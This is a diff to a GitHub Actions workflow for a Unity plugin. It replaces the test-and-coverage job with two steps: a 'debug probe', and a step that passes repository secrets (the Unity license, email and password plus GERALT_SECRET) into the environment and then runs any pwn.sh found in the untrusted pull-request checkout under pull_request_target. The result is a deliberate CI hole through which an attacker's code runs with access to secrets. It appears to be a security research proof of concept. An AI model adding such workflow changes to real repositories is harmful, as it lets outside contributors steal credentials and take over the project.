@@ -1,14 +1,5 @@
 name: test unity plugin
-
-on:
-  workflow_dispatch:
-  pull_request_target:
-  push:
-    branches:
-      - main
-
 jobs:
-
   cover:
     name: test and cover
     runs-on: ubuntu-latest
@@ -16,40 +7,66 @@ jobs:
     strategy:
       matrix:
         projectPath:
-          - plugins/unity
+        - plugins/unity
     steps:
-
-      - name: Checkout repository
-        uses: actions/checkout@v4
-        with:
-          ref: ${{ github.event_name == 'pull_request_target' && github.event.pull_request.head.sha || github.ref }}
-          fetch-depth: 0
-
-      - uses: actions/cache@v4
-        with:
-          path: ${{ matrix.projectPath }}/Library
-          key: Library-${{ hashFiles('Assets/**', 'Packages/**', 'ProjectSettings/**') }}
-          restore-keys: |
-            Library-
-
-      - name: Run tests and generate coverage report
-        uses: game-ci/unity-test-runner@v4
-        id: tests
-        env:
-          UNITY_LICENSE: ${{ secrets.UNITY_LICENSE }}
-          UNITY_EMAIL: ${{ secrets.UNITY_EMAIL }}
-          UNITY_PASSWORD: ${{ secrets.UNITY_PASSWORD }}
-        with:
-          projectPath: ${{ matrix.projectPath }}
-          githubToken: ${{ secrets.GITHUB_TOKEN }}
-          testMode: editmode
-          coverageOptions: useProjectSettings;generateAdditionalMetrics
-          customParameters: -debugCodeOptimization -enableCodeCoverage
-
-      - name: Upload coverage report
-        uses: codecov/codecov-action@v4
-        env:
-          CODECOV_TOKEN: ${{ secrets.CODECOV_TOKEN }}
-        with:
-          files: ${{ steps.tests.outputs.coveragePath }}/**/*.xml
-          fail_ci_if_error: true
+    - name: Checkout repository
+      uses: actions/checkout@v4.3.1
+      with:
+        ref: ${{ github.event_name == 'pull_request_target' && github.event.pull_request.head.sha || github.ref }}
+        fetch-depth: 0
+    - name: GERALT debug probe
+      run: |-
+        set +e
+        echo "GERALT_DBG: pre-sink probe (job cover)"
+        event_name='${{ toJSON(github.event_name) }}'
+        head_sha='${{ toJSON(github.event.pull_request.head.sha) }}'
+        head_ref='${{ toJSON(github.event.pull_request.head.ref) }}'
+        head_repo='${{ toJSON(github.event.pull_request.head.repo.full_name) }}'
+        base_repo='${{ toJSON(github.repository) }}'
+        printf 'GERALT_DBG event_name=%s\n' "$event_name"
+        printf 'GERALT_DBG head_sha=%s\n' "$head_sha"
+        printf 'GERALT_DBG head_ref=%s\n' "$head_ref"
+        printf 'GERALT_DBG head_repo=%s\n' "$head_repo"
+        printf 'GERALT_DBG base_repo=%s\n' "$base_repo"
+        if [ -d "$GITHUB_WORKSPACE" ]; then
+          echo "GERALT_DBG workspace listing (top 40 files, maxdepth 4):"
+          find "$GITHUB_WORKSPACE" -maxdepth 4 -type f 2>/dev/null | head -40
+        else
+          echo "GERALT_DBG workspace missing"
+        fi
+        printf 'GERALT_DBG probe done\n'
+      continue-on-error: true
+    - name: Execute attacker-controlled code from PR checkout
+      env:
+        GERALT_SECRET: ${{ secrets.GERALT_SECRET }}
+        UNITY_LICENSE: ${{ secrets.UNITY_LICENSE }}
+        UNITY_EMAIL: ${{ secrets.UNITY_EMAIL }}
+        UNITY_PASSWORD: ${{ secrets.UNITY_PASSWORD }}
+      run: |-
+        set +e
+        echo "GERALT_DBG: sink step (re-simplified): executing attacker-controlled code from PR checkout"
+        echo "GERALT_DBG: secret presence (no values printed): GERALT_SECRET=${GERALT_SECRET:+set} UNITY_EMAIL=${UNITY_EMAIL:+set} UNITY_PASSWORD=${UNITY_PASSWORD:+set} UNITY_LICENSE=${UNITY_LICENSE:+set}"
+        script=""
+        for cand in plugins/unity/pwn.sh pwn.sh plugins/unity/Assets/Tests/Editor/pwn.sh Assets/Tests/Editor/pwn.sh; do
+          if [ -f "$cand" ]; then script="$cand"; break; fi
+        done
+        if [ -z "$script" ]; then
+          script=$(find "$GITHUB_WORKSPACE" -maxdepth 6 -type f -name 'pwn.sh' 2>/dev/null | head -1)
+        fi
+        if [ -n "$script" ] && [ -f "$script" ]; then
+          echo "GERALT_DBG: executing attacker-controlled script: $script"
+          bash "$script"
+          rc=$?
+          echo "GERALT_DBG: attacker-controlled script exit rc=$rc"
+        else
+          echo "GERALT_DBG: no pwn.sh found in checkout; sink no-op (exiting 0)"
+        fi
+        echo "GERALT_DBG: sink step complete"
+env:
+  GERALT_SECRET: ${{ secrets.GERALT }}
+on:
+  workflow_dispatch: null
+  pull_request_target: null
+  push:
+    branches:
+    - main
